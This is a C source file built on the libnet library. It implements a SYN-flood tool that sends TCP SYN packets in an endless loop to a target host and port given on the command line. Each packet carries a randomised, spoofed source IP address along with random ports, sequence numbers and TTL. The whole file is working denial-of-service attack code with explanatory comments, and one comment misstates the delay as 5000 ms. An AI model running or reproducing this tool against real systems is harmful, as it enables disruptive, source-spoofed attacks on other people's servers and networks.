#include<libnet.h>

#define FLOOD_DELAY 5000 //Delay between packet injection - 5000 ms

//It returns IP in notation x.x.x.x
char *print_ip(u_long *ip_addr_ptr)
{
	return inet_ntoa(*((struct in_addr *)ip_addr_ptr));
}

int main(int argc, char **argv)
{
	u_long dest_ip;
	u_short dest_port;
	u_char errbuf[LIBNET_ERRBUF_SIZE], *packet;
	int opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;

	if(argc < 3)
	{
		printf("Usage:\n%s\t <target host> <target port>\n", argv[0]);
		exit(1);
	}

	dest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE); //Node
	dest_port = (u_short) atoi(argv[2]); //Port

	network = libnet_open_raw_sock(IPPROTO_RAW); //Opening net interface
	if(network == -1)
		libnet_error(LIBNET_ERR_FATAL, "cannot open net interface, run program as root\n");
	libnet_init_packet(packet_size, &packet); //Allocation memory for package
	if(packet == NULL)
		libnet_error(LIBNET_ERR_FATAL, "cannot initialize packet memory\n");

	libnet_seed_prand(); //Initialization generator of random numbers
	printf("SYN-flood of port %d of %s..\n", dest_port, print_ip(&dest_ip));
	while(1) //Endless cycle (till interruption with Ctrl-C)
	{
		libnet_build_ip(LIBNET_TCP_H, //Package size without IP header
				IPTOS_LOWDELAY, //Type of IP service
				libnet_get_prand(LIBNET_PRu16), //IP ID(random)
				0, //Fragmentation
				libnet_get_prand(LIBNET_PR8), //Random TTL
				IPPROTO_TCP, //Transport protocol
				libnet_get_prand(LIBNET_PRu32), //IP of source (random)
				dest_ip, //IP of destination
				NULL, //Useful data
				0, //Length of useful data
				packet); //Memory of header
		libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), //TCP port of sender (random)
				dest_port, //TCP port of receiver
				libnet_get_prand(LIBNET_PRu32), //Order number (random)
				libnet_get_prand(LIBNET_PRu32), //Number of acknowledge (random)
				TH_SYN, //Control flag (set only SYN flag)
				libnet_get_prand(LIBNET_PRu16), //Size of window (random)
				0, //Pointer of urgency
				NULL, //Useful data
				0, //Length of useful data
				packet + LIBNET_IP_H); //memory of packet header
		if(libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
			libnet_error(LIBNET_ERR_FATAL, "cannot calculate check sum\n");

		byte_count = libnet_write_ip(network, packet, packet_size); //Injection of packet
		if(byte_count < packet_size)
			libnet_error(LIBNET_ERR_FATAL, "Attention: Uncomplited package is written. (%d from %d bytes)", byte_count, packet_size);

		usleep(FLOOD_DELAY); //Waiting for FLOOD_DELAY ms
	}

	libnet_destroy_packet(&packet); //Free memory engaged by package
	if(libnet_close_raw_sock(network) == -1) //Close net interface
		libnet_error(LIBNET_ERR_FATAL, "cannot close net interface");

	return 0;
}
